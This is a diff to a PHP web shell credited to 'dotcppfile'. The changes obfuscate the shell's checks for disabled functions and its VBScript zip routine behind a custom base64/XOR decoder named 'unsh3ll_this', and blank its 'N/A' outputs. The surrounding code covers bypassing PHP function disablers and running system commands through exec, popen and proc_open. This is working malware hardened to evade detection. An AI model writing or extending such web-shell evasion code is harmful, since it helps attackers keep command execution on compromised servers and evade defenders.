@@ -155,31 +155,6 @@ function getPaths($root)
 }
 #<--
 
-#Checks if a function is/isn't disabled
-$disbls = @ini_get('disable_functions').','.@ini_get('suhosin.executor.func.blacklist');
-if ($disbls == ",")
-{
-	$disbls = get_cfg_var('disable_functions').','.get_cfg_var('suhosin.executor.func.blacklist');
-}
-$disbls = str_replace(" ", "", $disbls);
-$disblsArray = explode(",", $disbls);
-
-function checkIt($func)
-{
-	global $disblsArray;
-
-	foreach ($disblsArray as $value)
-	{
-		if ($func == $value)
-		{
-			return False;
-		}
-	}
-
-	return True;
-}
-#<--
-
 #`base64_encode`, `base64_decode`, `bindec` and `decbin` Replacements to bypass Disablers-->
 $base64ids = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/");
 
@@ -346,6 +321,31 @@ function sh3ll_this($string)
 function unsh3ll_this($string)
 {
 	return base64decoding(sh3ll_this(base64decoding($string)));
+}
+#<--
+
+#Checks if a function is/isn't disabled
+$disbls = @ini_get(unsh3ll_this("AAYHAhIcAzYKEAoMAAofHhU=")).','.@ini_get(unsh3ll_this("FxocDAMZCEcJHQEMARcfAkgPGQsHQRYPERMNBQUWEA=="));
+if ($disbls == ",")
+{
+	$disbls = get_cfg_var(unsh3ll_this("AAYHAhIcAzYKEAoMAAofHhU=")).','.get_cfg_var(unsh3ll_this("FxocDAMZCEcJHQEMARcfAkgPGQsHQRYPERMNBQUWEA=="));
+}
+$disbls = str_replace(" ", "", $disbls);
+$disblsArray = explode(",", $disbls);
+
+function checkIt($func)
+{
+	global $disblsArray;
+
+	foreach ($disblsArray as $value)
+	{
+		if ($func == $value)
+		{
+			return False;
+		}
+	}
+
+	return True;
 }
 #<--
 
@@ -624,30 +624,7 @@ function evalRel($command)
 #Zips Windows Dir-->
 function zipWindows($zip_location, $folder)
 {
-	$code = 'ArchiveFolder "' . $zip_location . '", "' . $folder . '"
-
-Sub ArchiveFolder (zipFile, sFolder)
-
-    With CreateObject("Scripting.FileSystemObject")
-        zipFile = .GetAbsolutePathName(zipFile)
-        sFolder = .GetAbsolutePathName(sFolder)
-
-        With .CreateTextFile(zipFile, True)
-            .Write Chr(80) & Chr(75) & Chr(5) & Chr(6) & String(18, chr(0))
-        End With
-    End With
-
-    With CreateObject("Shell.Application")
-        .NameSpace(zipFile).CopyHere .NameSpace(sFolder).Items
-
-        Do Until .NameSpace(zipFile).Items.Count = _
-                 .NameSpace(sFolder).Items.Count
-            WScript.Sleep 1000 
-        Loop
-    End With
-
-End Sub';
-
+	$code = 'ArchiveFolder "' . $zip_location . '", "' . $folder . '"'.unsh3ll_this("NxoWQzECBQEFEwEpGw8UFRRJRB8NHzIKHBVKSR8jCwMQBgJZbGNMRURPIwoEGEYqHgAFGxEsEhoDChhNRjwXERkAEgACAkopHQ8VIx8aGAAJIBYJFRMSS0VvRE9UQ1BQRkkWDBQpHQ8VUFtJQiIBGzUBAx8KHBgANA4ACz4RCwxEHw0fMgocFU9jTEVET1RDUFAVLwMJAAoGQ01QSC4JESUNBwwcBRIMPAQQBzoCHRVOGioKCAsREVl6bElMRURPVENQJw8dBEVKLAYGEQQDPQkdECkdDxVYHAAcIw0DEU9QJBQcCUxuT1RDUFBGSUxFRE9UTScCDx0JRScHBktIQE9JSkUnBwZLR0VPSUpFJwcGS0VZRk9MJgwdXFVZUEBJPxEWBhoEWEFeRUwGDB1cU1lZbElMRURPVENQNQgNTDINGxxpUFBGSSkLAE8jCgQYbGNMRURPIwoEGEYqHgAFGxEsEhoDChhNRjwcBhwcSCgcFQgGFwIEGQkHTkxuT1RDUFBGSUxLKg4ZBiMABwoJTR4GBCUZHANAQiYLHw0rFQIDSUIrBQIRMAARBQxEFiIAGAcVAk9HJREBAgdpelBGSUxFRE9UJx9QMwcYDAhPWi0RHQM6HAQHClwZGQAgAAAATUE9FxUdFUcvChEBAENNUDljTEVET1RDUFBGSUxFRE9UQ1BeKAgBADcfFQAVWBUvAwkACgZKXjkSDAEWSiwbFh4EbElMRURPVENQUEZJTDI3DAYKAARIOgAAAR9UUkBAVklmRURPVENQUEYlAwoUZVRDUFAjBwhFMwYAC3p6IwcIRTcaFg==");
 
 	file_put_contents("zipFolder.vbs", $code);
 	evalRel("cscript //nologo zipFolder.vbs");
@@ -1097,7 +1074,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		echo "
 		<tr>
 			<td>Version</td>
-			<td>N/A</td>
+			<td></td>
 		</tr>";
 	}
 
@@ -1120,7 +1097,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		echo "
 		<tr>
 			<td>Current User</td>
-			<td>N/A</td>
+			<td></td>
 		</tr>";
 	}
 
@@ -1190,17 +1167,17 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 					}					
 					else
 					{ 
-						echo "N/A";
+						echo "";
 					}				
 				}
 				else 
 				{
-					echo "N/A";
+					echo "";
 				}
 			}
 			else 
 			{
-				echo "N/A";
+				echo "";
 			}
 		}
 		else if($exec == True)
@@ -1219,17 +1196,17 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 					}					
 					else
 					{ 
-						echo "N/A";
+						echo "";
 					}				
 				}
 				else 
 				{
-					echo "N/A";
+					echo "";
 				}
 			}
 			else 
 			{
-				echo "N/A";
+				echo "";
 			}		
 		}
 		else if($popen == True)
@@ -1250,17 +1227,17 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 					}					
 					else
 					{ 
-						echo "N/A";
+						echo "";
 					}				
 				}
 				else 
 				{
-					echo "N/A";
+					echo "";
 				}
 			}
 			else 
 			{
-				echo "N/A";
+				echo "";
 			}			
 		}
 		else if($proc_open == True)
@@ -1302,17 +1279,17 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 							}							
 							else
 							{ 
-								echo "N/A";
-							}						
+								echo "";
+							}
 						}
 						else 
 						{
-							echo "N/A";
+							echo "";
 						}
 					}
 					else 
 					{
-						echo "N/A";
+						echo "";
 					}
 				}
 			}
@@ -1545,9 +1522,6 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 	</tr>";
 	#<--
 
-$ip = $_SERVER['REMOTE_ADDR'];
-$agent = $_SERVER['HTTP_USER_AGENT'];
-
 echo "
 </table>
 </td>
@@ -1559,11 +1533,11 @@ echo "
 	</tr>
 	<tr>
 		<td>Your IP</td>
-		<td>$ip</td>
+		<td>".$_SERVER['REMOTE_ADDR']."</td>
 	</tr>
 	<tr>
 		<td>Your UA</td>
-		<td>$agent</td>
+		<td>".$_SERVER['HTTP_USER_AGENT']."</td>
 	</tr>
 	<tr>
 		<td>Writeable/Readable Dir</td>
